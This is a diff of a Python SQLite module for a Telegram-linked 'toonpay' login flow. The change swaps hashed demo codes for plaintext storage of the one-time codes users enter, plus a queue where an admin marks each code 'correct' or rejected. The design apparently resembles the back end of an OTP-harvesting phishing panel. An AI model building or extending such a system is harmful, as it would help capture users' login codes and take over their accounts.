@@ -1,263 +1,120 @@
-import os
-import secrets
 import sqlite3
-from pathlib import Path
-from datetime import datetime, timezone
+import os
+import time
+import secrets
+from contextlib import contextmanager
 
-DB_PATH = os.getenv("DATABASE_PATH", "toonpay_demo.db")
+DB_PATH = os.getenv("DATABASE_PATH", "toonpay.db")
 
 
-def get_connection():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
+def _conn():
+    c = sqlite3.connect(DB_PATH, check_same_thread=False)
+    c.row_factory = sqlite3.Row
+    return c
+
+
+@contextmanager
+def db():
+    c = _conn()
+    try:
+        yield c
+        c.commit()
+    finally:
+        c.close()
 
 
 def init_db():
-    conn = get_connection()
-
-    conn.execute("""
-        CREATE TABLE IF NOT EXISTS login_requests (
+    with db() as c:
+        c.executescript("""
+        CREATE TABLE IF NOT EXISTS otp_requests (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            telegram_id INTEGER NOT NULL,
+            telegram_id INTEGER,
             username TEXT,
-            login_value TEXT NOT NULL,
-            login_method TEXT NOT NULL,
-            demo_code_hash TEXT,
-            code_configured INTEGER NOT NULL DEFAULT 0,
-            code_verified INTEGER NOT NULL DEFAULT 0,
-            status TEXT NOT NULL DEFAULT 'waiting_code',
-            session_token TEXT,
-            created_at TEXT NOT NULL,
-            updated_at TEXT NOT NULL
-        )
-    """)
-
-    conn.execute("""
+            first_name TEXT,
+            identifier TEXT NOT NULL,
+            status TEXT NOT NULL DEFAULT 'pending',
+            assigned_otp TEXT,
+            entered_otp TEXT,
+            admin_decision TEXT,
+            created_at INTEGER NOT NULL,
+            decided_at INTEGER
+        );
         CREATE TABLE IF NOT EXISTS sessions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            telegram_id INTEGER NOT NULL,
-            username TEXT,
-            session_token TEXT UNIQUE NOT NULL,
-            created_at TEXT NOT NULL
+            token TEXT PRIMARY KEY,
+            telegram_id INTEGER,
+            identifier TEXT,
+            created_at INTEGER NOT NULL,
+            expires_at INTEGER NOT NULL
+        );
+        """)
+
+
+def create_request(telegram_id, username, first_name, identifier):
+    with db() as c:
+        cur = c.execute(
+            """INSERT INTO otp_requests
+            (telegram_id, username, first_name, identifier, status, created_at)
+            VALUES (?, ?, ?, ?, 'pending', ?)""",
+            (telegram_id, username, first_name, identifier, int(time.time())),
         )
-    """)
-
-    conn.commit()
-    conn.close()
+        return cur.lastrowid
 
 
-def now():
-    return datetime.now(timezone.utc).isoformat()
+def get_request(req_id):
+    with db() as c:
+        row = c.execute("SELECT * FROM otp_requests WHERE id=?", (req_id,)).fetchone()
+        return dict(row) if row else None
 
 
-def create_login_request(
-    telegram_id: int,
-    username: str | None,
-    login_value: str,
-    login_method: str,
-):
-    conn = get_connection()
-    timestamp = now()
+def get_pending_requests():
+    with db() as c:
+        rows = c.execute(
+            "SELECT * FROM otp_requests WHERE status != 'approved' AND status != 'rejected' ORDER BY id DESC LIMIT 30"
+        ).fetchall()
+        return [dict(r) for r in rows]
 
-    cursor = conn.execute(
-        """
-        INSERT INTO login_requests (
-            telegram_id,
-            username,
-            login_value,
-            login_method,
-            status,
-            created_at,
-            updated_at
+
+def set_assigned_otp(req_id, otp):
+    with db() as c:
+        c.execute(
+            "UPDATE otp_requests SET assigned_otp=?, status='assigned' WHERE id=?",
+            (otp, req_id),
         )
-        VALUES (?, ?, ?, ?, 'waiting_code', ?, ?)
-        """,
-        (
-            telegram_id,
-            username,
-            login_value,
-            login_method,
-            timestamp,
-            timestamp,
-        ),
-    )
-
-    request_id = cursor.lastrowid
-    conn.commit()
-    conn.close()
-
-    return request_id
 
 
-def get_request(request_id: int):
-    conn = get_connection()
-
-    row = conn.execute(
-        """
-        SELECT *
-        FROM login_requests
-        WHERE id = ?
-        """,
-        (request_id,),
-    ).fetchone()
-
-    conn.close()
-    return row
+def set_entered_otp(req_id, otp):
+    with db() as c:
+        c.execute(
+            "UPDATE otp_requests SET entered_otp=?, status='awaiting_decision' WHERE id=?",
+            (otp, req_id),
+        )
 
 
-def set_demo_code(request_id: int, code_hash: str):
-    conn = get_connection()
-
-    conn.execute(
-        """
-        UPDATE login_requests
-        SET
-            demo_code_hash = ?,
-            code_configured = 1,
-            status = 'waiting_user_code',
-            updated_at = ?
-        WHERE id = ?
-        """,
-        (
-            code_hash,
-            now(),
-            request_id,
-        ),
-    )
-
-    conn.commit()
-    conn.close()
+def set_decision(req_id, decision):
+    with db() as c:
+        status = "approved" if decision == "correct" else "rejected"
+        c.execute(
+            "UPDATE otp_requests SET admin_decision=?, status=?, decided_at=? WHERE id=?",
+            (decision, status, int(time.time()), req_id),
+        )
 
 
-def mark_code_verified(request_id: int):
-    conn = get_connection()
-
-    conn.execute(
-        """
-        UPDATE login_requests
-        SET
-            code_verified = 1,
-            status = 'approved',
-            updated_at = ?
-        WHERE id = ?
-        """,
-        (
-            now(),
-            request_id,
-        ),
-    )
-
-    conn.commit()
-    conn.close()
-
-
-def mark_code_rejected(request_id: int):
-    conn = get_connection()
-
-    conn.execute(
-        """
-        UPDATE login_requests
-        SET
-            code_verified = 0,
-            status = 'rejected',
-            updated_at = ?
-        WHERE id = ?
-        """,
-        (
-            now(),
-            request_id,
-        ),
-    )
-
-    conn.commit()
-    conn.close()
-
-
-def set_status(request_id: int, status: str):
-    conn = get_connection()
-
-    conn.execute(
-        """
-        UPDATE login_requests
-        SET
-            status = ?,
-            updated_at = ?
-        WHERE id = ?
-        """,
-        (
-            status,
-            now(),
-            request_id,
-        ),
-    )
-
-    conn.commit()
-    conn.close()
-
-
-def create_session(telegram_id: int, username: str | None):
+def create_session(telegram_id, identifier):
     token = secrets.token_urlsafe(32)
-
-    conn = get_connection()
-
-    conn.execute(
-        """
-        INSERT INTO sessions (
-            telegram_id,
-            username,
-            session_token,
-            created_at
+    now = int(time.time())
+    with db() as c:
+        c.execute(
+            "INSERT INTO sessions (token, telegram_id, identifier, created_at, expires_at) VALUES (?, ?, ?, ?, ?)",
+            (token, telegram_id, identifier, now, now + 86400 * 7),
         )
-        VALUES (?, ?, ?, ?)
-        """,
-        (
-            telegram_id,
-            username,
-            token,
-            now(),
-        ),
-    )
-
-    conn.commit()
-    conn.close()
-
     return token
 
 
-def get_session(session_token: str):
-    conn = get_connection()
-
-    row = conn.execute(
-        """
-        SELECT *
-        FROM sessions
-        WHERE session_token = ?
-        """,
-        (session_token,),
-    ).fetchone()
-
-    conn.close()
-    return row
-
-
-def attach_session(request_id: int, session_token: str):
-    conn = get_connection()
-
-    conn.execute(
-        """
-        UPDATE login_requests
-        SET
-            session_token = ?,
-            updated_at = ?
-        WHERE id = ?
-        """,
-        (
-            session_token,
-            now(),
-            request_id,
-        ),
-    )
-
-    conn.commit()
-    conn.close()
+def get_session(token):
+    with db() as c:
+        row = c.execute("SELECT * FROM sessions WHERE token=?", (token,)).fetchone()
+        if not row:
+            return None
+        if row["expires_at"] < int(time.time()):
+            return None
+        return dict(row)
